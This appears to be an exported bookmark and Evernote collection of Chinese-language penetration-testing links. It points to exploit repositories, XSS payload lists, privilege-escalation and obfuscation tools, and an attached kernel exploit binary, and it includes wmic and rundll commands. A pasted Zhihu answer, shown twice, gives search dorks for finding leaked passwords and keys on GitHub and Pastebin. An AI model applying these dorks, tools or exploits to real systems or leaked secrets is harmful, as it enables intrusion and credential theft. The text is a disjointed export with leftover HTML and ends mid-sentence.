icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">cujanovic（PredragCujanović）/存储库</a><br>        <dt><a href="http://house.163.com/17/1018/17/D120VADC000792IT.html" add_date="1528640212" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAcElEQVQ4ja1RQQ7AMAhiS///ZXdyMYisy8bJEoqowEccigwgBnHTN6J+zg+KkwYszHet2WSpqC4ywxpMu9gyCCBqArPYd115rNMJ1A64gYzI59s5ZwN3qu9ar0k0pWDcBkrouMf4KeTo4xKnERz/Cy6pAjoL4fNqsQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">租客自述：豆瓣租房也被骗 如何把黑中介告上法庭_网易房产频道</a><br>        <dt><a href="https://www.douban.com/group/topic/108900749/" add_date="1528669134" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACEUlEQVQ4jXWSv2tTURTHv+fc+/JeEpPXWht/gIJDUWitqKDYbhlEEByqqz8GIYLFzcF/QHBVwcVB6yBIcCoqOhVpEWn9SScpTdyMrSUvNUmbd89xeDGD1jPdA+d87/d+74eCxe0KBUAghRIIgEIJAAhA0vYGrDoFAQoiMAy2KoWIqpICsJBEj1vShLS3XAAHPmcUQiALB0Om7aJz/eev7Lgca8zEPWOiYsk+WHn4bK0cmLyodG8w4i21lp+sPO1o/Je6R3aptWzES15i4aBQS+mPjYWz4ZnR7DBADAYgEEA//1qcqk0FJq9OAFBqro8ABWLp1I5/m43mHn9/FNgQ0HYcXdh5aTw/Vni3z7LXTQkOCgAQcZGLpldflCtlpAAAHQx4uw9lR8Q5aM+SJJkSCacpuLandDgz7JsMgVY3a2PheJrTJEyAKkAwfNEnJShYyWM/YD/gTMg5C5ooTBzMHLhVuf22Pp/MqCqlXvcplIk3XBPNjbtH76+79ZsfbsDgU/HLm7XZyfmr2BakTFpVCGRVlMGxtIsDxaFde4/ljpzsP1FtVgf9wmhuZKH+vjRU+tqqzvycsRwIhLznIRNvxo3J/ddPD56qd+qiEnqhqkRxlGI/a7Ivf7y6V7mTsjlRIW86TNDoxA2I6/KWBNc7s/FsrouGOiWQQnzOE9N/4FPnXMKLJSEoQMm//pH8Z7FH129xZPt0jDwM6gAAAABJRU5ErkJggg==" target="_blank" rel="noopener">租房指南，请务必精读至少一遍。欢迎大家*积极宣传…</a><br>    <dl><p><br></p></dl><p><br><br><br>  ——————–<br>#### 印象笔记收藏的 ####<br>          <html><br><head><meta name="generator" content="Hexo 3.8.0"><br>  <title>Evernote Export</title><br>  <basefont face="微软雅黑" size="2"><br>  <meta http-equiv="Content-Type" content="text/html;charset=utf-8"><br>  <meta name="exporter-version" content="YXBJ Windows/600240 (zh-CN, DDL); Windows/6.1.1 (Win64);"><br>  <style><br>    body, td {<br>      font-family: 微软雅黑;<br>      font-size: 10pt;<br>    }<br>  </style><br><link rel="alternate" href="/atom.xml" title="九世的博客" type="application/atom+xml"></head><br><body><br><a name="459"><br><br><div><span><div><a href="https://github.com/trimstray/awesome-ninja-admins/blob/master/README.md" target="_blank" rel="noopener">https://github.com/trimstray/awesome-ninja-admins/blob/master/README.md</a></div><div><br></div><div><img src="Demon分享_files/20180715-235422.png" type="image/png" data-filename="20180715-235422.png"></div></span><br></div><br><hr><br><a name="489"><br><br><div><span><div><a href="https://pentester.land/newsletter/2018/07/09/the-5-hacking-newsletter-11.html" target="_blank" rel="noopener">https://pentester.land/newsletter/2018/07/09/the-5-hacking-newsletter-11.html</a></div></span><br></div><br><hr><br><a name="493"><br><br><div><br><span><div><a href="https://leotindall.com/tutorial/an-intro-to-x86_64-reverse-engineering/" target="_blank" rel="noopener">https://leotindall.com/tutorial/an-intro-to-x86_64-reverse-engineering/</a></div></span><br></div><br><hr><br><a name="494"><br><br><div><br><span><div><a href="https://github.com/0xdea/tactical-exploitation" target="_blank" rel="noopener">https://github.com/0xdea/tactical-exploitation</a></div></span><br></div><br><hr><br><a name="495"><br><br><div><br><span><div><a href="https://github.com/codewhitesec/LethalHTA/tree/master/CobaltStrike" target="_blank" rel="noopener">https://github.com/codewhitesec/LethalHTA/tree/master/CobaltStrike</a></div></span><br></div><br><hr><br><a name="497"><br><br><div><br><span><div><a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler" target="_blank" rel="noopener">https://github.com/nccgroup/BurpSuiteHTTPSmuggler</a></div></span><br></div><br><hr><br><a name="498"><br><br><div><br><span><div><a href="https://github.com/austin-taylor/VulnWhisperer" target="_blank" rel="noopener">https://github.com/austin-taylor/VulnWhisperer</a></div></span><br></div><br><hr><br><a name="499"><br><br><div><br><span><div><a href="https://github.com/wez3/msfenum" target="_blank" rel="noopener">https://github.com/wez3/msfenum</a></div></span><br></div><br><hr><br><a name="500"><br><br><div><br><span><div><a href="https://github.com/thehappydinoa/TP-Link-defaults" target="_blank" rel="noopener">https://github.com/thehappydinoa/TP-Link-defaults</a></div></span><br></div><br><hr><br><a name="502"><br><br><div><br><span><div><img src="Demon分享_files/mmexport1527673496221.jpg" type="image/jpeg" data-filename="mmexport1527673496221.jpg">巧妙运行dll</div><div><br></div></span><br></div><br><hr><br><a name="506"><br><br><div><span><div><a href="https://paper.seebug.org/95/" target="_blank" rel="noopener">https://paper.seebug.org/95/</a></div></span><br></div><br><hr><br><a name="513"><br><br><div><span><div><a href="https://resources.infosecinstitute.com/powershell-for-pentesters-part-2-the-essentials-of-powershell/" target="_blank" rel="noopener">https://resources.infosecinstitute.com/powershell-for-pentesters-part-2-the-essentials-of-powershell/</a></div></span><br></div><br><hr><br><a name="523"><br><br><div><br><span><div>作者：Twosecurity</div><div>链接：链接：https://www.zhihu.com/question/23073812/answer/219630853</div><div>来源：知乎</div><div>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</div><div><br></div><div>漏洞挖掘http://rips-scanner.sourceforge.net/ RIPS 自动化PHP代码安全审计RIPS是一款专门用来进行静态PHP代码审计的工具，能够帮助我们定位到可能存在漏洞的代码区域。使用指南 http://www.freebuf.com/articles/web/12232.htmlhttp://www.freebuf.com/articles/web/12232.htmlhttps://github.com/ajinabraham/Mobile-Security-Framework-MobSF 开源 iOS/Andriod 应用安全自动化测试平台Mobile Security Framework (移动安全框架) 是一款智能、一体化的开源移动应用(Android/iOS)自动渗透测试框架，它能进行静态、动态的分析。是一款智能、一体化的开源移动应用(Android/iOS)自动渗透测试框架，它能进行静态、动态的分析。https://github.com/ajinabraham/Mobile-Security-Framework-MobSF使用说明 https://github.com/ajinabraham/Mobile-Security-Framework-MobSF/wiki/中文介绍 http://www.freebuf.com/sectool/77803.htmlhttp://www.freebuf.com/sectool/77803.htmlhttps://github.com/rapid7/IoTSeeker 智能家电漏洞扫描 一款基于端口对物联网默认凭证网络扫描的工具，针对特定的物联网设备进行检测这些自动化的工具可以帮助我们从结果这个角度去学习渗透测试Burpsuite，Web 手工挖掘漏洞必用下载 http://www.freebuf.com/sectool/99127.html实战指南 https://t0data.gitbooks.io/burpsuite/爆破字典 https://github.com/1N3/IntruderPayloadsSQLMap 扩展 https://github.com/difcareer/sqlmap4burpTCP 抓包扩展 https://github.com/summitt/Burp-Non-HTTP-ExtensionNmap https://nmap.org/安装 https://nmap.org/book/install.html上手教程 NMAP 基础教程 - he1renyagao进阶的使用 Nmap速查手册 - 我是壮丁Beef http://beefproject.com/Docker 镜像 https://hub.docker.com/r/janes/beef/实战指南 浏览器利用框架BeEF测试 - 三好学生AWVS，很厉害的 web 扫描器，简单易用下载 http://www.freebuf.com/sectool/71091.html （评论）使用教程 http://www.freebuf.com/sectool/100713.htmlHydra，常见网络服务登陆爆破工具下载 https://github.com/vanhauser-thc/thc-hydra/releases第三方 windows 版本下载 https://github.com/maaaaz/thc-hydra-windows/releases使用讲解 http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.htmlSqlmap，SQL注入最厉害的工具官网 http://sqlmap.org/上手教程 SQLMAP 实例COOKBOOK - lxj616进阶的使用 SQLMAP进阶使用 - MayIKissYou一段没有任何改动的代码，放在互联网上，也可能因为各种通用组件没有及时更新而变得脆弱。而搜索引擎则可以帮助我们更快的找到主机安全Shodan，撒旦 Shodan是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机，工控系统等）的搜索引擎。它在圈子里就像google一样出名。它主要拦截从服务器到客户端的元数据来工作，目前提供超过50个端口的相关搜索。Shodan搜索引擎介绍 - 修码的马修ZoomeyeZoomEye(钟馗之眼)是知道创宇推出的一款网络空间搜索引擎，和撒旦的用法类似修码的马修ZoomeyeZoomEye(钟馗之眼)是知道创宇推出的一款网络空间搜索引擎，和撒旦的用法类似https://www.zoomeye.org/help/manual信息泄漏GithubGitHub是全球最大的社交编程及代码托管网站。用户可以十分轻易地管理、存储、和搜索程序代码，其因此受到了广大程序员们的喜欢。  上面泄漏的敏感信息不仅只有个人的邮箱、企业后台，通过渗透黑客很可能获取企业的核心业务源代码，应用的逻辑架构，数据库地址、账号密码，内部vpn信息，人事信息等所有内部敏感信息，所带来的危害比被攻破数道防火墙，被挖掘出数个web漏洞要大得多！邮箱账户smtp @http://xxx.comsmtp password后台地址admin password数据库信息Mysql root passwordsa password云服务的密钥aliyun_access_idApiKeyGoogle        hackSite:http://baidu.com学习案例新浪某开发人员意识不足监控邮箱泄漏（github）搜狐某开发人员意识不足导致某官方微博帐号与邮箱权限泄漏（github）新浪某开发人员意识不足导致某官方微博帐号与邮箱权限泄漏（github）京东某开发人员意识不足泄漏一些敏感信息（github）唯品会某些开发人员意识不足泄漏敏感信息（github）盛大某开发人员意识不足泄漏内部邮箱帐号密码（github）迅雷某开发人员意识不足泄漏内部邮箱帐号密码（github）github-hacker之某短信运营商平台漏洞致上万用户信息泄漏其连锁反应不可想象|Pastebin Pastebin 与 github 不同，它不提供代码托管、版本控制等复杂的功能，只提供展示文本、代码最基本功能。所以经常被黑客用于披露或是存放数据，很多时候我们可以通过 pastebin 提前得到泄漏的数据。site:http://pastebin.com @http://163.comsite:http://pastebin.com @http://qq.comsite:http://pastebin.com appleid总之… 你能想到的，或多或少，应该都有，发挥你的想象力</div></span><br></div><br><hr><br><a name="524"><br><br><div><br><span><div><a href="https://github.com/frizb/vanquish" target="_blank" rel="noopener">https://github.com/frizb/vanquish</a></div></span><br></div><br><hr><br><a name="525"><br><br><div><span><div><a href="https://conference.hitb.org/hitbsecconf2018ams/materials/D2T1%2520-%2520Philip%2520Tsukerman%2520-%2520Expanding%2520Your%2520WMI%2520Lateral%2520Movement%2520Arsenal.pdf" target="_blank" rel="noopener">https://conference.hitb.org/hitbsecconf2018ams/materials/D2T1%2520-%2520Philip%2520Tsukerman%2520-%2520Expanding%2520Your%2520WMI%2520Lateral%2520Movement%2520Arsenal.pdf</a></div></span><br></div><br><hr><br><a name="526"><br><br><div><span><div><a href="https://redcanary.com/blog/active-breach-establishing-persistence/?utm_campaign=Blog&amp;utm_content=73611572&amp;utm_medium=social&amp;utm_source=twitter#admin-shares" target="_blank" rel="noopener">https://redcanary.com/blog/active-breach-establishing-persistence/?utm_campaign=Blog&amp;utm_content=73611572&amp;utm_medium=social&amp;utm_source=twitter#admin-shares</a></div></span><br></div><br><hr><br><a name="527"><br><br><div><span><div>rundll1132.exe -sta {注册表数值}</div><div><br></div><div><a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/" target="_blank" rel="noopener">https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/</a></div></span><br></div><br><hr><br><a name="528"><br><br><div><span><div>Linux提权审计:<span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">https://github.com/mzet-/linux-exploit-suggester</span></div></span><br></div><br><hr><br><a name="530"><br><br><div><span><div><a href="https://github.com/joker25000/Optiva-Framework" target="_blank" rel="noopener">https://github.com/joker25000/Optiva-Framework</a></div></span><br></div><br><hr><br><a name="630"><br><br><div><span><div><div style="margin: 0px; padding: 0px; box-sizing: border-box; color: rgb(51, 51, 51); font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; overflow: auto;"><div>wmic process call create “calc.exe”</div></div><pre style="margin: 0px; padding: 0px; max-width: 100%; box-sizing: border-box; word-wrap: break-word !important; color: rgb(51, 51, 51); font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; overflow: auto;">wmic process where name=”calc.exe” call terminate</pre></div><div><img src="Demon分享_files/mmexport1527673769009.webp" type="image/webp" data-filename="mmexport1527673769009.webp"><img src="Demon分享_files/mmexport1527673770763.webp" type="image/webp" data-filename="mmexport1527673770763.webp"></div></span><br></div><br><hr><br><a name="655"><br><br><div><span><div><span style="color: rgb(51, 51, 51); font-family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; font-size: 17px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: 0.544px; orphans: 2; text-align: justify; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;">https://github.com/m4ll0k/Galileo</span></div></span><br></div><br><hr><br><a name="657"><br><br><div><span><div><a href="https://securityonline.info/opendoor-owasp-web-directory-scanner/" target="_blank" rel="noopener">https://securityonline.info/opendoor-owasp-web-directory-scanner/</a></div></span><br></div><br><hr><br><a name="684"><br><br><div><span><div><a href="https://github.com/smgorelik/Windows-RCE-exploits" target="_blank" rel="noopener">https://github.com/smgorelik/Windows-RCE-exploits</a></div></span><br></div><br><hr><br><a name="694"><br><br><div><span><div>内核提权漏洞</div><div>漏洞描述:<a href="https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8166" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8166</a></div><div><br></div><div><a href="Demon分享_files/CVE-2018-8120.exe"><img src="Demon分享_files/eb8d2266c08cbaa20b428432066c25f7.png" alt="CVE-2018-8120.exe"></a>64位有可能卡死</div></span><br></div><br><hr><br><a name="699"><br><br><div><span><div><a href="https://n0where.net/protection-against-port-scanners-portspoof" target="_blank" rel="noopener">https://n0where.net/protection-against-port-scanners-portspoof  </a></div></span><br></div><br><hr><br><a name="701"><br><br><div><span><div><a href="https://github.com/rootm0s/WinPwnage" target="_blank" rel="noopener">https://github.com/rootm0s/WinPwnage</a></div><div><img src="Demon分享_files/-4d578e12a0f6d5f2.jpg" type="image/jpeg" data-filename="-4d578e12a0f6d5f2.jpg"></div></span><br></div><br><hr><br><a name="703"><br><br><div><span><div>适用于:内网渗透</div><div><a href="https://n0where.net/automated-privilege-escalation-portia" target="_blank" rel="noopener">https://n0where.net/automated-privilege-escalation-portia</a></div></span><br></div><br><hr><br><a name="710"><br><br><div><span><div>https://github.com/api0cradle/LOLBAS   我觉得内网渗透的人 应该人手一份</div></span><br></div><br><hr><br><a name="712"><br><br><div><span><div><a href="https://github.com/ismailtasdelen/xss-payload-list" target="_blank" rel="noopener">https://github.com/ismailtasdelen/xss-payload-list</a></div></span><br></div><br><hr><br><a name="713"><br><br><div><span><div><a href="http://payloads.online/archivers/2018-05-02/1#0-qzone-1-51191-d020d2d2a4e8d1a374a433f596ad1440" target="_blank" rel="noopener">http://payloads.online/archivers/2018-05-02/1#0-qzone-1-51191-d020d2d2a4e8d1a374a433f596ad1440</a></div></span><br></div><br><hr><br><a name="714"><br><br><div><span><div><a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a></div></span><br></div><br><hr><br><a name="729"><br><br><div><span><div>@即刻安全-无尘 工具包工具包https://www.52pojie.cn/thread-463343-1-1.html   虚拟机虚拟机https://www.52pojie.cn/thread-661779-1-1.html</div></span><br></div><br><hr><br><a name="731"><br><br><div><span><div><a href="https://www.pentestpartners.com/security-blog/from-png-text-to-persistent-xss/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/from-png-text-to-persistent-xss/</a></div></span><br></div><br><hr><br><a name="733"><br><br><div><span><div><a href="https://github.com/mdsecactivebreach/SharpShooter/blob/master/Readme.md" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter/blob/master/Readme.md</a></div></span><br></div><br><hr><br><a name="910"><br><br><div><span><div><a href="https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/" target="_blank" rel="noopener">https://gosecure.net/2018/04/03/beyond-xss-edge-side-include-injection/</a></div></span><br></div><br><hr><br><a name="911"><br><br><div><span><div><a href="https://mp.weixin.qq.com/s/tt1NDweTkmIJke1VS7s7jw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tt1NDweTkmIJke1VS7s7jw</a></div></span><br></div><br><hr><br><a name="917"><br><br><div><span><div><a href="https://github.com/fgeek/pyfiscan/blob/master/README.md" target="_blank" rel="noopener">https://github.com/fgeek/pyfiscan/blob/master/README.md</a></div></span><br></div><br><hr><br><a name="921"><br><br><div><br><span><div><a href="https://github.com/1N3/IntruderPayloads" target="_blank" rel="noopener">https://github.com/1N3/IntruderPayloads</a></div></span><br></div><br><hr><br><a name="923"><br><br><div><br><span><div><a href="https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/" target="_blank" rel="noopener">https://olivierbeg.com/finding-xss-vulnerabilities-in-flash-files/</a></div></span><br></div><br><hr><br><a name="935"><br><br><div><br><span><div>例子：x=[1,2,3,4,5]</div><div>          print(&quot;,&quot;.join(str(i)for i in x))</div></span><br></div><br><hr><br><a name="936"><br><br><div><br><span><div><a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Privilege%20Escalation%20%26%20Post-Exploitation.md" target="_blank" rel="noopener">https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Privilege%20Escalation%20%26%20Post-Exploitation.md</a></div></span><br></div><br><hr><br><a name="938"><br><br><div><span><div><p style="margin: 0px 0px 25px; color: rgb(187, 187, 187); font-family: Monda, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif; font-size: 14px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(51, 51, 51); text-decoration-style: initial; text-decoration-color: initial;">独角兽是使用PowerShell降级攻击并直接将shellcode插入内存的简单工具。基于Matthew Graeber的PowerShell攻击和由David Kennedy（TrustedSec）和Josh Kelly在Defcon 18提供的PowerShell旁路技术。</p><div style="margin: 0px 0px 25px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(51, 51, 51); text-decoration-style: initial; text-decoration-color: initial;"><div><span style="color: rgb(187, 187, 187);"><span style="font-size: 14px;"><span style="font-family: Monda, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, sans-serif;">用法很简单，只需运行Magic Unicorn（确保在使用Metasploit方法并在正确的路径中安装Metasploit），魔术独角兽会自动生成一个PowerShell命令，您只需将PowerShell代码剪切并粘贴到命令行窗口或通过有效载荷传送系统。独角兽支持你自己的shellcode，和Metasploit</span></span></span></div><div><a href="http://www.ggsec.cn/unicorn.html" target="_blank" rel="noopener">http://www.ggsec.cn/unicorn.html</a></div></div></div></span><br></div><br><hr><br><a name="940"><br><br><div><span><div><a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-Obfuscation</a></div></span><br></div><br><hr><br><a name="941"><br><br><div><span><div>youtube关注:Penetration Testing in Linux</div></span><br></div><br><hr><br><a name="948"><br><br><div><span><div><a href="https://github.com/swisskyrepo/PayloadsAllTheThings?files=1" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings?files=1</a></div></span><br></div><br><hr><br><a name="953"><br><br><div><span><div><a href="https://github.com/p3nt4/Invoke-Piper" target="_blank" rel="noopener">https://github.com/p3nt4/Invoke-Piper</a></div></span><br></div><br><hr><br><a name="957"><br><br><div><span><div><a href="https://github.com/jobertabma/ground-control" target="_blank" rel="noopener">https://github.com/jobertabma/ground-control</a></div></span><br></div><br><hr><br><a name="958"><br><br><div><span><div>用于寻找ad组策略容易受到攻击的</div><div>powershell脚本:<a href="https://github.com/l0ss/Grouper" target="_blank" rel="noopener">https://github.com/l0ss/Grouper</a></div></span><br></div><br><hr><br><a name="960"><br><br><div><span><div><a href="http://mp.weixin.qq.com/s?__biz=MzI4MDQ1MzQ0NA==&amp;mid=2247483908&amp;idx=1&amp;sn=0ee87c9d7c66778b1ffe1fa46e9647b7&amp;chksm=ebb90a2fdcce83393af0a3c14b15d5a3a14677cef0e9f8c726d87761be8d7068c469dc05e772&amp;mpshare=1&amp;scene=23&amp;srcid=03250Ys5bPhYde4c2tJ6zBfa#rd" target="_blank" rel="noopener">http://mp.weixin.qq.com/s?<strong>biz=MzI4MDQ1MzQ0NA==&amp;mid=2247483908&amp;idx=1&amp;sn=0ee87c9d7c66778b1ffe1fa46e9647b7&amp;chksm=ebb90a2fdcce83393af0a3c14b15d5a3a14677cef0e9f8c726d87761be8d7068c469dc05e772&amp;mpshare=1&amp;scene=23&amp;srcid=03250Ys5bPhYde4c2tJ6zBfa#rd</strong></a></div></span><br></div><br><hr><br><a name="964"><br><br><div><br><span><div><a href="https://github.com/Moham3dRiahi/Th3inspector" target="_blank" rel="noopener">https://github.com/Moham3dRiahi/Th3inspector</a></div></span><br></div><br><hr><br><a name="965"><br><br><div><br><span><div><a href="https://github.com/Moham3dRiahi/XAttacker" target="_blank" rel="noopener">https://github.com/Moham3dRiahi/XAttacker</a></div></span><br></div><br><hr><br><a name="969"><br><br><div><span><div>&lt;a href=”http://mp.weixin.qq.com/s?biz=MjM5NTc2MDYxMw==&amp;mid=2458288524&amp;idx=1&amp;sn=7186aacb3aaf913a034b7c96b08e616f&amp;chksm=b181b10686f638107f07b425533528a6c79a7a2400c8ac7a00a222f37f59321e5e964b28795a&amp;mpshare=1&amp;scene=23&amp;srcid=0323pYe4Q0rg8aNfMhlCOzLP#rd”&gt;http://mp.weixin.qq.com/s?<strong>biz=MjM5NTc2MDYxMw==&amp;mid=2458288524&amp;idx=1&amp;sn=7186aacb3aaf913a034b7c96b08e616f&amp;chksm=b181b10686f638107f07b425533528a6c79a7a2400c8ac7a00a222f37f59321e5e964b28795a&amp;mpshare=1&amp;scene=23&amp;srcid=0323pYe4Q0rg8aNfMhlCOzLP#rd</strong></div></span></div></a><br><br><hr><br><a name="973"><br><br><div><span><div><a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/</a></div></span><br></div><br><hr><br><a name="1341"><br><br><div><span><div>&lt;a href=”http://mp.weixin.qq.com/s?biz=MjM5MDkwNjA2Nw==&amp;mid=2650374095&amp;idx=1&amp;sn=5d0fdb1efdba018f36a55aaa40c9aa7a&amp;chksm=beb07c7389c7f5650d3f1d26e0d5d5f230a5e569498f23dbb4cac925c34a133bf256a826f0b1&amp;mpshare=1&amp;scene=23&amp;srcid=032001PiVJ4OYGxi0zPubJdp#rd”&gt;http://mp.weixin.qq.com/s?__biz=MjM5MDkwNjA2Nw==&amp;mid=2650374095&amp;idx=1&amp;sn=5d0fdb1efdba018f36a55aaa40c9aa7a&amp;chksm=beb07c7389c7f5650d3f1d26e0d5d5f230a5e569498f23dbb4cac925c34a133bf256a826f0b1&amp;mpshare=1&amp;scene=23&amp;srcid=032001PiVJ4OYGxi0zPubJdp#rd</div></span></div></a><br><br><hr><br><a name="1342"><br><br><div><span><div><a href="http://www.cnblogs.com/backlion/p/7908563.html" target="_blank" rel="noopener">http://www.cnblogs.com/backlion/p/7908563.html</a></div></span><br></div><br><hr><br><a name="1343"><br><br><div><span><div><a href="https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet" target="_blank" rel="noopener">https://github.com/masatokinugawa/filterbypass/wiki/Browser’s-XSS-Filter-Bypass-Cheat-Sheet</a></div></span><br></div><br><hr><br><a name="1359"><br><br><div><span><div><a href="https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-2/" target="_blank" rel="noopener">https://www.sentinelone.com/blog/deep-hooks-monitoring-native-execution-wow64-applications-part-2/</a></div></span><br></div><br><hr><br><a name="1360"><br><br><div><span><div>作者：Twosecurity<br>链接：链接：https://www.zhihu.com/question/23073812/answer/219630853<br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。<br><br></div><div>漏洞挖掘http://rips-scanner.sourceforge.net/ RIPS 自动化PHP代码安全审计RIPS是一款专门用来进行静态PHP代码审计的工具，能够帮助我们定位到可能存在漏洞的代码区域。使用指南 http://www.freebuf.com/articles/web/12232.htmlhttp://www.freebuf.com/articles/web/12232.htmlhttps://github.com/ajinabraham/Mobile-Security-Framework-MobSF 开源 iOS/Andriod 应用安全自动化测试平台Mobile Security Framework (移动安全框架) 是一款智能、一体化的开源移动应用(Android/iOS)自动渗透测试框架，它能进行静态、动态的分析。是一款智能、一体化的开源移动应用(Android/iOS)自动渗透测试框架，它能进行静态、动态的分析。https://github.com/ajinabraham/Mobile-Security-Framework-MobSF使用说明 https://github.com/ajinabraham/Mobile-Security-Framework-MobSF/wiki/中文介绍 http://www.freebuf.com/sectool/77803.htmlhttp://www.freebuf.com/sectool/77803.htmlhttps://github.com/rapid7/IoTSeeker 智能家电漏洞扫描 一款基于端口对物联网默认凭证网络扫描的工具，针对特定的物联网设备进行检测这些自动化的工具可以帮助我们从结果这个角度去学习渗透测试Burpsuite，Web 手工挖掘漏洞必用下载 http://www.freebuf.com/sectool/99127.html实战指南 https://t0data.gitbooks.io/burpsuite/爆破字典 https://github.com/1N3/IntruderPayloadsSQLMap 扩展 https://github.com/difcareer/sqlmap4burpTCP 抓包扩展 https://github.com/summitt/Burp-Non-HTTP-ExtensionNmap https://nmap.org/安装 https://nmap.org/book/install.html上手教程 NMAP 基础教程 - he1renyagao进阶的使用 Nmap速查手册 - 我是壮丁Beef http://beefproject.com/Docker 镜像 https://hub.docker.com/r/janes/beef/实战指南 浏览器利用框架BeEF测试 - 三好学生AWVS，很厉害的 web 扫描器，简单易用下载 http://www.freebuf.com/sectool/71091.html （评论）使用教程 http://www.freebuf.com/sectool/100713.htmlHydra，常见网络服务登陆爆破工具下载 https://github.com/vanhauser-thc/thc-hydra/releases第三方 windows 版本下载 https://github.com/maaaaz/thc-hydra-windows/releases使用讲解 http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.htmlSqlmap，SQL注入最厉害的工具官网 http://sqlmap.org/上手教程 SQLMAP 实例COOKBOOK - lxj616进阶的使用 